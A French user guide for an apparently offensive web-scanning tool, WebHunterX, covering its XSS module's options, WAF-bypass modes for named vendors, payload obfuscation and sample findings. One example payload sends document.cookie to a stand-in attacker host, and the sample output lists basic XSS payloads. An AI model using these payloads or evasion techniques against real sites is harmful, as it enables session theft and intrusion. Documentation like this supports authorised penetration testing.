# Guide d'utilisation de WebHunterX

## Module XSS

Le module XSS (Cross-Site Scripting) de WebHunterX permet de détecter et exploiter les vulnérabilités XSS dans les applications web.

### Installation

```bash
# Installation depuis le dépôt
git clone https://github.com/webhunterx/webhunterx.git
cd webhunterx
pip install -e .

# Ou directement depuis PyPI (une fois disponible)
# pip install webhunterx
```

### Utilisation basique

Pour lancer un scan XSS simple sur une URL cible :

```bash
python -m webhunterx.xss https://exemple.com
```

Ou si installé via pip :

```bash
webhunterx-xss https://exemple.com
```

### Options disponibles

Le scanner XSS offre de nombreuses options pour personnaliser les scans :

```
Options:
  -h, --help            Afficher l'aide
  -o, --output OUTPUT   Fichier de sortie pour le rapport
  -c, --cookies COOKIES Cookies à utiliser (format: "nom=valeur; nom2=valeur2")
  -t, --timeout TIMEOUT Timeout en secondes (défaut: 10)
  -v, --verbose         Mode verbeux pour plus de détails
  -r, --recursive       Exploration récursive du site
  -d, --depth DEPTH     Profondeur d'exploration (défaut: 2)
  -w, --waf WAF         Type de WAF à contourner (cloudflare, akamai, modsecurity)
  -b, --bypass          Activer le mode bypass WAF
  -O, --obfuscation {0,1,2,3}
                        Niveau d'obfuscation des payloads (0=aucun, 3=maximum)
  -p, --payload PAYLOAD Payload XSS personnalisé
  -H, --headers HEADERS En-têtes HTTP (format: "Nom1: Valeur1; Nom2: Valeur2")
  -P, --proxy PROXY     Utiliser un proxy (format: http://proxy:port)
```

### Exemples d'utilisation

#### Scan basique avec mode verbeux

```bash
webhunterx-xss https://exemple.com -v
```

#### Scan avec contournement de WAF Cloudflare et obfuscation avancée

```bash
webhunterx-xss https://exemple.com -b -w cloudflare -O 2
```

#### Scan avec authentification via cookies

```bash
webhunterx-xss https://exemple.com -c "PHPSESSID=abc123; auth=xyz789"
```

#### Scan avec payload personnalisé

```bash
webhunterx-xss https://exemple.com -p "<script>fetch('https://attacker.com/'+document.cookie)</script>"
```

#### Génération d'un rapport

```bash
webhunterx-xss https://exemple.com -o rapport.json
```

### Interprétation des résultats

Après l'exécution du scan, le programme affiche un résumé des résultats :

```
Résumé du scan XSS:
URL cible: https://exemple.com
Points d'injection trouvés: 12
Vulnérabilités détectées: 3
Temps écoulé: 45.23 secondes

Vulnérabilités trouvées:
1. https://exemple.com/search.php - URL parameter: q - <script>alert(1)</script>
2. https://exemple.com/contact.php - Form input: message - <img src=x onerror=alert(1)>
3. https://exemple.com/profile.php - Form input: username - <svg onload=alert(1)>
```

Pour une analyse plus détaillée, consultez le rapport JSON généré avec l'option `-o`.

### Fonctionnalités avancées

#### Bypass de WAF

Le module dispose de techniques spécifiques pour contourner les protections WAF :

```bash
webhunterx-xss https://exemple.com -b -w cloudflare
```

Supports des WAF :
- Cloudflare
- Akamai
- ModSecurity
- Techniques génériques (par défaut)

#### Obfuscation des payloads

Trois niveaux d'obfuscation disponibles :

1. Basique : encodage Unicode simple
2. Intermédiaire : encodage Base64, utilisation de fromCharCode
3. Avancé : techniques combinées et exploitation d'événements DOM

```bash
webhunterx-xss https://exemple.com -O 3
```

#### Exploration récursive

Pour analyser l'ensemble d'un site web :

```bash
webhunterx-xss https://exemple.com -r -d 3
```

### Avertissement de sécurité

Utilisez cet outil **uniquement** sur des systèmes pour lesquels vous avez une autorisation explicite. L'utilisation non autorisée est illégale et contraire à l'éthique. 